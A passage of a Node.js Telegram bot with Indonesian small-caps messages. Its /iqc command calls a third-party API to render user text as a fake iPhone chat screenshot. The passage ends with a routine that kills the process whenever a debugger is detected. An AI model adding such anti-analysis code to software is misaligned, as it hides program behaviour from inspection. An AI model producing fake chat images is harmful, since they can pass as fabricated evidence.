            [{ text: "ᴄʀᴇᴀᴛᴏʀ", url: "https://t.me/heysaka", style: "success", icon_custom_emoji_id: "5319301933645707826" }]
          ]
        }
      }
    );

  } catch (error) {
    console.error('Error sendMediaGroup:', error);
    bot.sendMessage(
      chatId,
      blockQuote('❌ ɢᴀɢᴀʟ ᴍᴇɴɢɪʀɪᴍ ɢᴀᴍʙᴀʀ. ʙᴇʙᴇʀᴀᴘᴀ ᴜʀʟ ᴍᴜɴɢᴋɪɴ ᴋᴏʀᴜᴘ.'),
      {
        ...replyOpt,
        reply_markup: {
          inline_keyboard: [
            [{ text: "ᴄʀᴇᴀᴛᴏʀ", url: "https://t.me/heysaka", style: "success", icon_custom_emoji_id: "5319301933645707826" }]
          ]
        }
      }
    );
  }
}

bot.onText(/^\/iqc(?:\s+(.+))?$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const input = match[1] ? match[1].trim() : "";

  if (!input) {
    return bot.sendMessage(
      chatId,
      `<blockquote>⚠️ ꜰᴏʀᴍᴀᴛ ᴘᴇɴɢɢᴜɴᴀᴀɴ:

/ɪǫᴄ &lt;ᴛᴇᴋꜱ&gt;

ᴄᴏɴᴛᴏʜ:
/ɪǫᴄ ʜᴀʟᴏ, ꜱᴇʟᴀᴍᴀᴛ ᴍᴀʟᴀᴍ!

ᴀᴛᴀᴜ ᴋᴜꜱᴛᴏᴍ ᴊᴀᴍ:
/ɪǫᴄ ʜᴀʟᴏ | 22:15 | 22:15</blockquote>`,
      {
        parse_mode: "HTML",
        reply_to_message_id: msg.message_id,
        reply_markup: {
          inline_keyboard: [
            [{ text: "ᴄʀᴇᴀᴛᴏʀ", url: "https://t.me/heysaka", style: "success", icon_custom_emoji_id: "5319301933645707826" }]
          ]
        }
      }
    );
  }

  const now = new Date();
  const timeOptions = { timeZone: "Asia/Jakarta", hour: "2-digit", minute: "2-digit", hour12: false };
  const currentTime = now.toLocaleTimeString("id-ID", timeOptions).replace(".", ":");

  let textParam = input;
  let chatTimeParam = currentTime;
  let statusBarTimeParam = currentTime;

  if (input.includes("|")) {
    const parts = input.split("|").map(p => p.trim());
    textParam = parts[0] || "Hello";
    chatTimeParam = parts[1] || currentTime;
    statusBarTimeParam = parts[2] || parts[1] || currentTime;
  }

  const waitMsg = await bot.sendMessage(
    chatId,
    `<blockquote>🎨 ᴍᴇᴍʙᴜᴀᴛ ǫᴜᴏᴛᴇ ɪᴘʜᴏɴᴇ...</blockquote>`,
    {
      parse_mode: "HTML",
      reply_to_message_id: msg.message_id
    }
  );

  try {
    await bot.sendChatAction(chatId, "upload_photo");

    const apiUrl = `https://api.ikyyxd.my.id/canvas/iqc?text=${encodeURIComponent(textParam)}&chatTime=${encodeURIComponent(chatTimeParam)}&statusBarTime=${encodeURIComponent(statusBarTimeParam)}`;

    const { data } = await axios.get(apiUrl, { timeout: 25000 });

    let imageUrl = null;
    if (typeof data === 'string' && data.startsWith('http')) {
      imageUrl = data;
    } else if (data) {
      imageUrl = data.result || data.url || data.data || (data.status && data.result?.url ? data.result.url : null);
    }

    if (!imageUrl && data && data.status === false) {
      return bot.editMessageText(
        `<blockquote>❌ ɢᴀɢᴀʟ ᴍᴇᴍʙᴜᴀᴛ ɢᴀᴍʙᴀʀ ɪǫᴄ. ᴘᴀꜱᴛɪᴋᴀɴ ᴛᴇᴋꜱ ᴛɪᴅᴀᴋ ᴛᴇʀʟᴀʟᴜ ᴘᴀɴᴊᴀɴɢ.</blockquote>`,
        {
          chat_id: chatId,
          message_id: waitMsg.message_id,
          parse_mode: "HTML"
        }
      );
    }

    await bot.deleteMessage(chatId, waitMsg.message_id).catch(() => {});

    const targetUrl = imageUrl || apiUrl;

    await bot.sendPhoto(chatId, targetUrl, {
      caption: `<blockquote>✨ ɪᴘʜᴏɴᴇ ᴄʜᴀᴛ ɢᴇɴᴇʀᴀᴛᴏʀ\n💬 "${textParam}"</blockquote>`,
      parse_mode: "HTML",
      reply_to_message_id: msg.message_id,
      reply_markup: {
        inline_keyboard: [
          [{ text: "ᴄʀᴇᴀᴛᴏʀ", url: "https://t.me/heysaka", style: "success", icon_custom_emoji_id: "5319301933645707826" }]
        ]
      }
    });

  } catch (error) {
    console.error("Error /iqc command:", error.message);

    try {
      const directApiUrl = `https://api.ikyyxd.my.id/canvas/iqc?text=${encodeURIComponent(textParam)}&chatTime=${encodeURIComponent(chatTimeParam)}&statusBarTime=${encodeURIComponent(statusBarTimeParam)}`;

      await bot.deleteMessage(chatId, waitMsg.message_id).catch(() => {});
      await bot.sendPhoto(chatId, directApiUrl, {
        caption: `<blockquote>✨ ɪᴘʜᴏɴᴇ ᴄʜᴀᴛ ɢᴇɴᴇʀᴀᴛᴏʀ\n💬 "${textParam}"</blockquote>`,
        parse_mode: "HTML",
        reply_to_message_id: msg.message_id,
        reply_markup: {
          inline_keyboard: [
            [{ text: "ᴄʀᴇᴀᴛᴏʀ", url: "https://t.me/heysaka", style: "success", icon_custom_emoji_id: "5319301933645707826" }]
          ]
        }
      });
    } catch (fallbackError) {
      await bot.editMessageText(
        `<blockquote>❌ ᴛᴇʀᴊᴀᴅɪ ᴋᴇsᴀʟᴀʜᴀɴ sᴀᴀᴛ ᴍᴇᴍᴘʀᴏsᴇs ɢᴀᴍʙᴀʀ / sᴇʀᴠᴇʀ ᴀᴘɪ sᴇᴅᴀɴɢ ᴇʀʀᴏʀ.</blockquote>`,
        {
          chat_id: chatId,
          message_id: waitMsg.message_id,
          parse_mode: "HTML"
        }
      ).catch(() => {});
    }
  }
});
//================================================//
function detectDebugger() {
  const start = Date.now();
  debugger;
  if (Date.now() - start > 100) {
    console.error("Debugger detected! Exiting...");
    process.exit(1);
  }
}

setInterval(detectDebugger, 5000);
//==============================================//
